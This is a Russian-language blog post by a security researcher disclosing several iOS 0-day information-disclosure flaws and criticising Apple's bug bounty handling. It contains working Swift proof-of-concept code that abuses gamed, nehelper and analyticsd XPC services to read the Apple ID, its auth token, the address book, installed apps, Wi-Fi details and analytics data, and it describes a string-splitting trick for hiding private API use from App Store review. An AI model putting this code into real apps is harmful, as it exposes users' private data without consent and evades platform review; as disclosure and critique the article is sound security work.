@@ -1,0 +1,299 @@
+Автор: illusionofchaos
+Дата: 2021-09-23T23:30:36.000Z
+Название: Статья, в которой я раскрываю три 0-day уязвимости в iOS и критикую
+bug bounty программу Apple
+Теги: Информационная безопасность *, Разработка под iOS *, Разработка
+мобильных приложений *, Реверс-инжиниринг *
+Текст:
+Дисклеймер: Apple была уведомлена обо всех описанных в статье
+уязвимостях в период с 10 марта по 4 мая, ответы о принятии в работу
+со стороны Apple приходили на следующий день после каждого
+уведомления. В соответствии с responsible disclosure policy, Google
+Project Zero раскрывает уязвимости через 90 дней после уведомления
+вендора, ZDI - через 120, независимо от того, исправлена уязвимость
+или нет. Я же выждал намного больше (до полугода) и 10 дней назад
+предупредил Apple, о том, скоро буду вынужден публично раскрыть эти
+уязвимости. Ответа не последовало, поэтому я решил написать эту
+статью.Все уязвимости имеют класс Information Disclosure, а именно
+получение чувствительной информации приложениями из App Store без
+запроса разрешений у пользователя, либо обход sandbox и получение
+такой информации, к которой у приложений в принципе не должно быть
+доступа. Я загрузил на GitHub код приложений, который я отправлял в
+Apple для демонстрации уязвимостей, его можно запустить на своих
+устройствах и посмотреть, приложения только получают данные и
+отображают их в UI. Вот список уязвимостей вместе с данными, которые
+они могут получить:Gamed 0-day (iOS 15.0)Ссылка на
+репозиторийПозволяет получить доступ к следующим данным:e-mail
+аккаунта Apple ID, в который выполнен вход на устройстве и полное имя
+владельца этого Apple ID, а также authentication token, позволяющий
+отправлять запросы на сервера Apple от имени этого Apple ID (судя по
+всему ограничен только функциями, связанными с GameKit, я не проверял
+тщательно этот момент)Доступ к содержимому следующих файлов для чтения
+(сейчас в iOS 15.0 доступен только первый, видимо, частично
+пофиксили):/var/mobile/Library/CoreDuet/People/interactionC.db -
+содержит список контактов из сообщений Почта, Сообщения, прочих
+мессенджеров (к примеру, Telegram и WhatsApp), а также метаданные о
+взамодействии с этими контактами, включая статистику и точноее время
+каждого взаимодействия с каждым контактом/var/mobile/Library/Preferenc
+es/com.apple.mobilephone.speeddial.plist - содержит список избранных
+контактов из быстрого набора в приложении
+Телефон/var/mobile/Library/AddressBook/AddressBook.sqlitedb - Содержит
+полную адресную книгу со всеми контактами на
+устройстве/var/mobile/Library/AddressBook/AddressBookImages.sqlitedb -
+Содержит фотографии контактов из адресной книгиNehelper installed apps
+0-day (iOS 15.0)Ссылка на репозиторийПозволяет проверить, установлено
+ли то или иное приложение на устройстве по bundle ID. В коде на GitHub
+содержится список самых популярных приложений, каждое из которых
+проверяется, после чего выдается список тех из них, что были найдены
+на устройстве.Nehelper wifi info 0-day (iOS 15.0)Ссылка на
+репозиторийНезначительная уязвимость, позволяющая получить доступ к
+информации о точке доступа Wi-Fi, к которой в данный момент подключен
+устройство без наличия необходимого entitlement у приложения. Проверка
+на entitlement была добавлена в iOS 12, но ее можно легко обойти,
+правда для этого у приложения должен быть доступ к
+геолокации.Analyticsd (исправлено в iOS 14.7)Ссылка на
+репозиторийПозволяет получить доступ к данным аналитики на устройстве
+(Эти данные можно увидеть, открыв приложение Настройки -> Приватность
+-> Аналитика и улучшения -> Данные аналитики -> Analytics-90Day... and
+Analytics-Daily...). Данные содержат, помимо прочего:Информация о
+пользовании устройством (количество раз, когда пользователь брал в
+руки устройство в разных контекстах, сколько пришло push-уведомлений,
+и как пользователь на них отреагировал)Информация об экранном времени
+(сколько времени пользователь провел в каждом приложении с указанием
+Bundle ID этих приложений, а также сколько раз он открывал эти
+приложения)Медицинская информация (пульс, число обнаруженных
+фибрилляций и нарушений сердечного ритма)Метаданные из приложения
+Здоровье, связанные с отслеживанием менструального цикла, включая его
+продолжительность, а также возраст пользователяИнформация обо всех
+аксессуарах, которые подлючались к устройству (к примеру, AirPods) с
+указанием производителя, модели, версии прошивки и имен, которые
+пользователь присвоил этим аксессуарамИнформация о крашах приложений,
+включающая их Bundle ID и коды исключений, которые вызвали крашЯзык
+страниц, которые пользователь просматривал в приложении Safari Данная
+уязвимость интересна тем, что Apple, после ее исправления, не указала
+ее в списке исправленных уязвимостей, сославшись на техническую
+ошибку, и пообещав указать ее в следующий раз. Тем не менее, ни в
+14.7.1, ни в 14.8, ни в 15.0 она не появилась. Также мои последующие
+вопросы по этому поводу были проигнорированы. Что наводит на мысль о
+том, что Apple пытается утаить эту уязвимость, а возможно и тот факт,
+что они сами собирают все эти данные и используют их в неизвестных
+целях.ВступлениеВ iOS существует огромное количество фоновых
+процессов, каждый из которых отвечает за какой-либо функционал. Эти
+процессы могут быть запущены от разных пользователей с разным уровнем
+привилегий и разными профилями sandbox, в отличие от приложений из App
+Store, которые максимально ограничены в возможностях. Поэтому для
+использования функций из большинства фреймворков, доступ к которым
+Apple предоставляет разработчикам, код в этих фреймворках
+взаимодействует с фоновыми процессами, передавая и получая от них
+данные через разные механизмы (в основном используется XPC). Есть 2
+вида XPC - первый использует C API для установления соединения и
+передачи сериализованных объектов, второй же является оберткой на
+Objective-C над первым (NSXPC), где интерфейс взаимодействия
+определяется как обычный протокол Objective-C, с обеих сторон
+соединения имеется по экземпляру какого-то класса, которые
+соотвествуют этому протоколу. Клиент просто вызывает методы этого
+прокси-объекта и получает ответ через callback, передаваемый как
+параметр при вызове метода. Далее NSXPC же, незаметно для клиента, при
+помощи NSCoding и NSInvocation связывает эти две сущности и вызывает
+аналогичный метод на другой стороне соединения. Приложение может
+обладать различными entitlements, наличие которых проверяется на
+стороне фоновых процессов при установке XPC соединений и вызове
+различных методов, для того, чтобы определить, разрешены ли эти
+действия конкретному приложению. Все уязвимости, о которых идет речь в
+этой статье являются логическими, то есть отсутствием различных
+проверок в привилегированных фоновых процессах, что приводит к тому,
+что любое приложение может к ним подключиться и получить
+конфиденциальные данные.GamedИтак, первая уязвимость связана с
+фреймворком GameKit и соответствующим ему фоновым процессом под
+названием com.apple.gamed. Данный процесс использует NSXPC и
+протоколом для прокси-объекта является GKDaemonProtocol. Ниже
+приведены сокращенные протоколы, где содержатся только нужные нам
+методы. Полностью файлы заголовков можно увидеть в репозитории на
+GitHub.@protocol GKDaemonProtocol <NSObject> @required - (oneway
+void)getServicesForPID:(int)arg1 localPlayer:(GKPlayerInternal *)arg2
+reply:(void (^)(<GKAccountService> , <GKProfileService>,
+<GKFriendService> , <GKGameService> , <GKGameStatService> ,
+<GKChallengeService> , <GKMultiplayerService> , <GKTurnBasedService> ,
+<GKUtilityService> , <GKBulletinService> , <GKAnalyticsService> ,
+<GKGameSessionService> , <GKTournamentService> ))arg3; @end  @protocol
+GKAccountService <NSObject> @required - (oneway
+void)authenticatePlayerWithExistingCredentialsWithHandler:(void
+(^)(GKAuthenticateResponse *, NSError *))arg1; @end  @protocol
+GKUtilityService <NSObject> @required - (oneway
+void)requestImageDataForURL:(NSURL *)arg1 subdirectory:(NSString
+*)arg2 fileName:(NSString *)arg3 handler:(void (^)(NSData *))arg4;
+@end  @interface GKAuthenticateResponse @property (nonatomic, retain)
+GKPlayerCredential *credential; @end  @interface GKPlayerCredential
+@property (retain) NSString *accountName; @property (retain) NSString
+*authenticationToken; @end Вот упрощенная версия кода, который
+позволяет нам получить данные. Ошибка номер один - нам возвращается
+объект, содержащий Apple ID и токен аутентификации (что в принципе не
+должно передаваться в приложение). Ошибка номер два - метод
+requestImageData не производит проверку на схему URL, и получая
+file:// считывает из файловой системы файл с указанным URL используя
+привилегии процесса gamed и возвращает нам в приложение его
+содержимое.let connection = NSXPCConnection(machServiceName:
+"com.apple.gamed", options: NSXPCConnection.Options.privileged)! let
+proxy = connection.remoteObjectProxyWithErrorHandler({ _ in }) as!
+GKDaemonProtocol let pid = ProcessInfo.processInfo.processIdentifier
+proxy.getServicesForPID(pid, localPlayer: nil, reply: {
+(accountService, _, _, _, _, _, _, _, utilityService, _, _, _, _) in
+accountService.authenticatePlayerWithExistingCredentials(handler: {
+response, error in         let appleID =
+response.credential.accountName         let token =
+response.credential.authenticationToken     }
+utilityService.requestImageData(for: URL(fileURLWithPath:
+"/var/mobile/Library/AddressBook/AddressBook.sqlitedb"), subdirectory:
+nil, fileName: nil, handler: { data in         let addressBookData =
+data     } } На странице программы Apple Security Bounty данная
+уязвимость оценивается в $100,000 (Broad app access to sensitive data
+normally protected by a TCC prompt or the platform sandbox. “Sensitive
+data” access includes gaining a broad access (i.e., the full database)
+from Contacts). Минимальная выплата за любые уязвимости, подходящие
+под категории с их сайта - 5,000$. Но по многочисленным свидетельствам
+участников этой программы, Apple затягивает в выплатах, а в итоге
+может либо отказать в выплате без указания причины, либо выплатить
+сумму, значительно меньше заявленной у них на сайте. Я сообщил о
+данной уязвимости 10 марта. 25 августа я получил ответ, что уязвимость
+будет исправлена в ближайшем обновлении. С тех пор прошел почти месяц,
+вышли iOS 14.8 и 15.0, но в них исправление отсутствует. Я не
+планировал опубликовывать 0-day уязвимости в открытом доступе, но это
+единственная возможность привлечь внимание к тому, что произошло с
+уязвимостью analyticsd, и к тому, как в целом работает программа Apple
+Security Bounty. Подробнее об этом в конце статьи.А сейчас небольшое
+отступление. У Apple есть такое понятие как Private API. Оно
+подразумевает символы C, классы и методы Objective-C, которые
+присутствуют в бинарных файлах фреймворков, но которые отсутствуют в
+файлах заголовков SDK, предоставляемых Apple разработчикам. По
+правилам App Store, использование приватных API запрещено. При
+загрузке бинарного файла в App Store Connect происходит проверка на
+использование приватных API, и в случае обнаружения, бинарный файл не
+загружается. После чего на почту приходит такое письмо:Dear Developer,
+We identified one or more issues with a recent delivery for your app,
+[APP_NAME] 1.0 (1). Please correct the following issues, then upload
+again.  ITMS-90338: Non-public API usage - The app contains or
+inherits from non-public classes in [APP_NAME]:
+GKFamiliarPlayerInternal, GKFriendPlayerInternal,
+GKLocalPlayerInternal . If method names in your source code match the
+private Apple APIs listed above, altering your method names will help
+prevent this app from being flagged in future submissions. In
+addition, note that one or more of the above APIs may be located in a
+static library that was included with your app. If so, they must be
+removed. For further information, visit the Technical Support
+Information at http://developer.apple.com/support/technical/  Best
+regards, The App Store Team Но проверка происходит таким образом, что
+у Apple есть просто список строк с названиями методов, и все эти
+строки ищутся в загружаемых бинарниках, что позволяет легко обойти эту
+проверку. Objective-C Runtime позволяет нам обращаться к классам таким
+образом: NSClassFromString("GKLocalPlayerInternal"]). Но в этом случае
+строка с названием класса все равно попадет в исполняемый файл. Но,
+если мы сделаем, к примеру, так:
+NSClassFromString(["GKLoc","lPlayerInternal"].joined(separator: "a")),
+строка не будет обнаружена, проверка пройдет успешно и приложение
+будет загружено в App Store. Данным методом пользуются многие крупные
+компании. К примеру в коде одного очень известного приложения с 500
+млн пользователей применяется шифр Цезаря для сокрытия использования
+приватных методов UIKit. А насчет скрытия факта использования С
+функций, являющихся private API, подробнее можно почитать в моем
+следующем посте (английская версия).В дополнение, правила и
+ограничения, которые Apple применяет к разработчикам, не едины для
+всех. Как пример можно привести секретный entitlement
+com.apple.developer.pushkit.unrestricted-voip, выдающийся некоторым
+приложениям, но я не буду подробно писать об этом в данной
+статье.Nehelper installed appsЗдесь и в остальных уязвимостях,
+подверженные фоновые процессы используют вариант XPC с С API. Но, для
+удобства, код ниже написан на Swift. Данный сервис под названием
+com.apple.nehelper отвечает за работу с Network Extensions. В нем есть
+определенный метод, который получает на вход Bundle ID приложения,
+после чего, в зависимости от того, обнаружено ли приложение на
+устройстве, нам возвращается какой-то UUID или nil. func
+isAppInstalled(bundleId: String) -> Bool {     let connection =
+xpc_connection_create_mach_service("com.apple.nehelper", nil, 2)
+xpc_connection_set_event_handler(connection, { _ in })
+xpc_connection_resume(connection)     let xdict =
+xpc_dictionary_create(nil, nil, 0)
+xpc_dictionary_set_uint64(xdict, "delegate-class-id", 1)
+xpc_dictionary_set_uint64(xdict, "cache-command", 3)
+xpc_dictionary_set_string(xdict, "cache-signing-identifier", bundleId)
+let reply = xpc_connection_send_message_with_reply_sync(connection,
+xdict)     if let resultData = xpc_dictionary_get_value(reply,
+"result-data"), xpc_dictionary_get_value(resultData, "cache-app-uuid")
+!= nil {         return true     }     return false } Nehelper wifi
+infoЭто еще одна уязвимость в том же сервисе. У разработчиков есть
+возможность получать информацию о Wi-Fi сети, к которой подключено
+устройство. Но для приложений, скомпилированных при использовании iOS
+12 SDK и выше, для этого требуется отдельный entitlement. Версия SDK
+передается в параметре sdk-version, который мы контролируем, поэтому
+данная проверка легко обходится. Но препятствием является то, что для
+этого у приложение должен быть доступ к геолокации.func wifi_info() ->
+String? {     let connection =
+xpc_connection_create_mach_service("com.apple.nehelper", nil, 2)
+xpc_connection_set_event_handler(connection, { _ in })
+xpc_connection_resume(connection)     let xdict =
+xpc_dictionary_create(nil, nil, 0)
+xpc_dictionary_set_uint64(xdict, "delegate-class-id", 10)
+xpc_dictionary_set_uint64(xdict, "sdk-version", 1) // можно вообще не
+указывать, тогда значение будет 0     xpc_dictionary_set_string(xdict,
+"interface-name", "en0")     let reply =
+xpc_connection_send_message_with_reply_sync(connection, xdict)     if
+let result = xpc_dictionary_get_value(reply, "result-data") {
+let ssid = String(cString: xpc_dictionary_get_string(result, "SSID"))
+let bssid = String(cString: xpc_dictionary_get_string(result,
+"BSSID"))         return "SSID: \(ssid)\nBSSID: \(bssid)"     } else {
+return nil     } } AnalyticsdИ, наконец, последняя уязвимость, которая
+была исправлена в iOS 14.7. Здесь проблема кроется в фоновом процессе,
+ответственном за сбор аналитики. В нем есть метод под названием log-
+dump, который не защищен никакими проверками, и любое приложение может
+подключиться к этому процессу и вызвать данный метод, в ответ получив
+огромное количество данных об использовании устройства.func
+analytics_json() -> String? {     let connection =
+xpc_connection_create_mach_service("com.apple.analyticsd", nil, 2)
+xpc_connection_set_event_handler(connection, { _ in })
+xpc_connection_resume(connection)     let xdict =
+xpc_dictionary_create(nil, nil, 0)
+xpc_dictionary_set_string(xdict, "command", "log-dump");     let reply
+= xpc_connection_send_message_with_reply_sync(connection, xdict);
+return xpc_dictionary_get_string(reply, "log-dump"); } 29 апреля я
+сообщил об этой уязвимости в Apple. 3 июня я получил письмо от Apple,
+в котором было написано, что данная уязвимость будет устранена в
+следующем обновлении. 19 июля вышла iOS 14.7, но в списке исправленных
+узявимостей ее нет. 20 июля я написал письмо в Apple с целью
+разъяснить ситуацию. 23 июля приходит ответ с извинениями, словами о
+том, что это случилось из-за "processing issue", уверениями, что
+уязвимость будет указана в следующем обновлении и вопросом о том, как
+меня упомянуть в списке исправлений. В тот же день я ответил и сразу
+получил ответ с подтверждением. 26 июля вышла iOS 14.7.1, в списке
+исправленных узявимостей опять ничего. 13 сентября вышла iOS 14.8, в
+списке исправленных узявимостей опять ничего. В тот же день я написал
+письмо в Apple с выражением разочарования в программе Apple Security
+Bounty, с повторной просьбой прояснить ситуацию и предупреждением, что
+при отсутствии ответа, я буду вынужден публично раскрыть информацию
+обо всех уязвимостях, которые я им отправил. 20 сентября вышла iOS
+15.0, в списке исправленных узявимостей опять ничего. По состоянию на
+24 сентября ответа я так и не получил, в связи с чем я публикую данную
+статью.Я не знаю, по какой причине Apple не хочет публиковать
+информацию об этой уязвимости, но я уверен, что большинство
+пользователей даже не подозревают о том, сколько информации Apple
+собирает о них под видом аналитики. Также неизвестно, с какой целью
+эта информация используется и кому передается. В связи с этим особенно
+лицемерно выглядит их позиция о том, что они заботятся о
+конфиденциальности пользователей.Я далеко не первый человек, который
+разочаровался в программе Apple Security Bounty, и я надеюсь, что мой
+опыт повлияет на решение багхантеров не сотрудничать с ними. Кому
+интересно почитать о негативном опыте других людей, список публикаций
+на эту тему есть в английской версии этой статьи.UPD: 25 сентября,
+ровно через 24 часа после этой публикации я получил ответ от Apple,
+цитирую:We saw your blog post regarding this issue and your other
+reports. We apologize for the delay in responding to you.We want to
+let you know that we are still investigating these issues and how we
+can address them to protect customers. Thank you again for taking the
+time to report these issues to us, we appreciate your
+assistance. Please let us know if you have any questions.UPD2: У меня
+нет возможности проверить, но джейлбрейк-разработчик утверждает, что у
+него получилось за один день написать tweak, который защищает от трех
+0-day уязвимостей, описанных в статье, причем сделал это за один
+день.UPD3: Я опубликовал следующий пост (пока только английская
+версия), где подробно расписал про метод скрытия факта использования С
+функций, являющихся private API, а также озвучил свои претензии к
+тому, как проходит ревью в App Store.UPD4: 1 октября вышла iOS 15.0.1.
+Все три уязвимости до сих пор не исправлены.
